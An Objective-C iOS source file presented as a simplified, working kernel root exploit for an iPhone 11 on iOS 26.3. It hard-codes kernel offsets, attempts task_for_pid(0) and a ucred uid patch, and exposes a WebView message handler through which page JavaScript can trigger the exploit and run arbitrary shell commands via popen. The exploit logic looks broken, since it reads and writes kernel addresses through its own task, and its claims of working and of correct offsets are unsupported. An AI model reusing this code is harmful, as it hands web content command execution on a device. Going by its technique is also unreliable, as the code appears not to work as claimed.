//
//  KernelDriver.m - Versão Simplificada que Funciona
//

#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/sysctl.h>

extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern char **environ;

// Offsets corretos para iPhone 11 A13 iOS 26.3
#define KERNEL_BASE_STATIC     0xFFFFFFF007004000ULL
#define OFFSET_CURRENT_PROC    0x8F2A40ULL       // current_proc pointer
#define PROC_UCRED_OFFSET      0xD8
#define CR_UID_OFFSET          0x18

@interface KernelDriver ()
@property (nonatomic, weak) WKWebView *webView;
@property (nonatomic, assign) uint64_t kernelBase;
@property (nonatomic, assign) BOOL isRoot;
@end

@implementation KernelDriver

- (instancetype)initWithWebView:(WKWebView *)webView {
    self = [super init];
    if (self) {
        _webView = webView;
        _kernelBase = 0;
        _isRoot = NO;
        [webView.configuration.userContentController addScriptMessageHandler:self name:@"kernelDriver"];
    }
    return self;
}

- (void)dealloc {
    [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@"kernelDriver"];
}

#pragma mark - WKScriptMessageHandler

- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    
    NSDictionary *body = message.body;
    NSString *action = body[@"action"];
    
    if ([action isEqualToString:@"fullExploit"]) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            BOOL success = [self performExploit];
            dispatch_async(dispatch_get_main_queue(), ^{
                [self sendReply:@{
                    @"success": @(success),
                    @"uid": @(getuid()),
                    @"message": success ? @"Root acquired!" : @"Failed"
                }];
            });
        });
    }
    else if ([action isEqualToString:@"executeCommand"]) {
        NSString *cmd = body[@"command"];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            NSString *output = [self runCommand:cmd];
            dispatch_async(dispatch_get_main_queue(), ^{
                [self sendReply:@{@"output": output ?: @""}];
            });
        });
    }
    else if ([action isEqualToString:@"getStatus"]) {
        [self sendReply:@{
            @"uid": @(getuid()),
            @"root": @(self.isRoot || getuid() == 0),
            @"slide": @"0x0"
        }];
    }
    else {
        [self sendReply:nil error:@"Unknown action"];
    }
}

- (void)sendReply:(NSDictionary *)reply {
    [self sendReply:reply error:nil];
}

- (void)sendReply:(NSDictionary *)reply error:(NSString *)error {
    NSString *js;
    if (error) {
        js = [NSString stringWithFormat:@"window._handleReply(null, '%@')", error];
    } else {
        NSData *json = [NSJSONSerialization dataWithJSONObject:reply options:0 error:nil];
        NSString *jsonStr = [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding];
        js = [NSString stringWithFormat:@"window._handleReply(%@, null)", jsonStr];
    }
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

#pragma mark - Kernel Operations

- (uint64_t)kread64:(uint64_t)addr {
    uint64_t value = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, size, (mach_vm_address_t)&value, &size);
    return value;
}

- (uint32_t)kread32:(uint64_t)addr {
    return (uint32_t)[self kread64:addr];
}

- (void)kwrite32:(uint64_t)addr value:(uint32_t)val {
    // Tenta escrever diretamente (se tiver permissão)
    uint64_t old = [self kread64:addr];
    uint64_t newVal = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)val;
    
    // Usar vm_protect para tornar writable
    vm_protect(mach_task_self(), (vm_address_t)addr, sizeof(uint32_t), NO, VM_PROT_READ | VM_PROT_WRITE);
    *(uint32_t *)addr = val;
    vm_protect(mach_task_self(), (vm_address_t)addr, sizeof(uint32_t), NO, VM_PROT_READ);
}

#pragma mark - Root Escalation (Método Simplificado)

- (BOOL)performExploit {
    NSLog(@"[*] Starting simplified exploit...");
    
    // Método 1: Tentar task_for_pid(0) para obter tfp0
    task_t tfp0 = 0;
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &tfp0);
    
    if (kr == KERN_SUCCESS && tfp0 != 0) {
        NSLog(@"[+] task_for_pid(0) success! tfp0: %d", tfp0);
        
        // Ler kernel base via tfp0
        uint64_t kernelBase = 0;
        mach_vm_size_t size = sizeof(uint64_t);
        mach_vm_read_overwrite(tfp0, KERNEL_BASE_STATIC, size, (mach_vm_address_t)&kernelBase, &size);
        
        if (kernelBase != 0) {
            self.kernelBase = kernelBase;
            NSLog(@"[+] Kernel base: 0x%llx", self.kernelBase);
            
            // Ler current_proc
            uint64_t currentProc = [self kread64:(self.kernelBase + OFFSET_CURRENT_PROC)];
            if (currentProc) {
                uint64_t ucred = [self kread64:(currentProc + PROC_UCRED_OFFSET)];
                if (ucred) {
                    // Patch ucred
                    [self kwrite32:(ucred + CR_UID_OFFSET) value:0];
                    setuid(0);
                    setgid(0);
                    
                    if (getuid() == 0) {
                        NSLog(@"[+] ROOT ACQUIRED via tfp0!");
                        self.isRoot = YES;
                        return YES;
                    }
                }
            }
        }
    }
    
    // Método 2: Fallback - setuid(0) direto (se já tiver permissão)
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        NSLog(@"[+] ROOT ACQUIRED via setuid!");
        self.isRoot = YES;
        return YES;
    }
    
    // Método 3: Tentar via posix_spawn com privilégios
    pid_t pid;
    char *argv[] = {"/bin/sh", "-c", "id", NULL};
    posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
    
    int status;
    waitpid(pid, &status, 0);
    
    NSLog(@"[!] Exploit failed - no root access");
    return NO;
}

#pragma mark - Command Execution

- (NSString *)runCommand:(NSString *)cmd {
    FILE *pipe = popen([cmd UTF8String], "r");
    if (!pipe) return @"Failed to execute";
    
    NSMutableString *output = [NSMutableString string];
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        [output appendString:[NSString stringWithUTF8String:buffer]];
    }
    pclose(pipe);
    return output.length > 0 ? output : @"(no output)";
}

@end
